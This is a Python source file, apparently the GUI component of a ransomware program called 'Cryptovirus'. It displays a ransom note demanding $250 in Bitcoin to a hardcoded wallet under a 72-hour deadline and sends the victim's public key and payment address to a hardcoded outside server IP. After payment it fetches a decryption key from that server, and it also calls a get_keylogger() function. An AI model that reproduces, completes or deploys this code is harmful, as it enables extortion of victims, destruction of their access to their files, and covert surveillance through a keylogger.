import tkinter as tk
import requests
from cryption import *
from drive_controller import *
from configurator import *

class GUI:
    def __init__(self,mode):
        if mode == 1:
            self.window=tk.Tk()
            self.start()
            
        elif mode==2:
            self.decrypt_window=tk.Tk()
            self.decrypt_window_start()
        
    def start(self):
        
        with open(f"C:/{dir_name}/{config_file}") as cf:
            line=cf.readlines()[0]
        time=line.replace("\n","").replace("time = ","")
        
        self.window.geometry("900x500")
        self.window.title("Cryptovirus")
        self.window.grid_columnconfigure(0, weight=1)
        self.window.config(background = "Red")
        
        warning_mark=tk.Label(self.window, text="! WARNING !",font=("Helvetica",25),background = "Red")
        warning_mark.pack(pady=(10,0))
        
        information=tk.Label(self.window, text=f"You has been hacked!\n Your files are encrypted, but you can still recover them. \n Send amount of 250$ to the Bitcoin address below. \n After manual verification of payment this program will automatically decrypt your files. \n You have 72 hours for this operation, until {time} UTC,\n after this time, keys for decryption will be DELATED. \n When payment will be completed in area below paste and send address \n from which cryptocurency has been send.",
                                font=("Helvetica",15),background = "Red")
        information.pack(pady=(30,0))
        
        entry = tk.Entry(self.window,width=50,justify='center', borderwidth=0, font= ("Helvetica",15))
        entry.insert(0, "1FBknzmxSyZ8bDkvG3gV6Ci3RSSe46iVeg")
        entry.configure(state="readonly")
        entry.pack(pady=(10,0))
        
        self.text_input = tk.Entry(self.window,width=50,justify='center',font= ("Helvetica",15))
        self.text_input.pack(pady=(10,0))
        
        send_button = tk.Button(text = "Send Address", command=lambda: self.send_btc_address())
        send_button.pack(pady=(5,0))
        
        self.response=tk.Label(self.window, text="",font=("Helvetica",25),background = "Red")
        self.response.pack(pady=(10,0))
        
        self.window.mainloop()
        
    def decrypt_window_start(self):
        
        self.decrypt_window.geometry("900x500")
        self.decrypt_window.title("Cryptovirus")
        self.decrypt_window.grid_columnconfigure(0, weight=1)
        self.decrypt_window.config(background = "Red")
        
        decrypt_information=tk.Label(self.decrypt_window, text="You can now decrypt your files by clicking button bellow. \n After using decryption button the lag is possible. Do not shut down the program. \n Thank you for cooperation :)",
                                font=("Helvetica",15),background = "Red")
        decrypt_information.pack(pady=(180,0))
        
        decrypt_button = tk.Button(self.decrypt_window, text = "Decrypt your data", command= self.decrypt_button_command)
        decrypt_button.pack(pady=(20,0))
        
        self.try_later_information=tk.Label(self.decrypt_window, text="",
                                font=("Helvetica",15),background = "Red")
        self.try_later_information.pack(pady=(10,0))

        self.decrypt_window.mainloop()
        
        
    def decrypt_button_command(self):
        self.try_later_information.config(text="")
        status_code, private_key = get_private_key()
        print(status_code)
        if  status_code == 200:
            key=decrypt_by_private_key(private_key)
            self.try_later_information.config(text="Decryption process has started. The virus will automatically shutdown when it will be done.")
            decryptDrive(key)
            self.decrypt_window.after(5000,lambda:self.decrypt_window.destroy())
            clean()
            get_keylogger()
            
        elif status_code == 400:
            self.try_later_information.config(text="Payment has not been verified yet. Try again later.")
             
    
    def send_btc_address(self):
        if self.text_input.get():
            if (len(self.text_input.get())>=27 and len(self.text_input.get())<=34) and (self.text_input.get()[0]=="1" or self.text_input.get()[0]=="3" or self.text_input.get()[0:2]=="bc1"):
                btc_address=self.text_input.get()
                
                with open(f"C:/{dir_name}/{config_file}",'a') as cf:
                    cf.write(f"btcaddress = {btc_address}")
                
                with open(f"C:/{dir_name}/{public_key_name}", "r") as key_file:
                    public_key=str(key_file.read()).replace("\n","")
                
                requests.post(f'http://35.208.177.30:8080/sendaddress', 
                                json={"public_key": public_key, "btc_address":btc_address})
                self.window.destroy()
                self.decrypt_window=tk.Tk()
                self.decrypt_window_start() 
                
            else:
                self.response.config(text="Incorrect BTC Address")
        else:
            self.response.config(text="Incorrect BTC Address")
			
	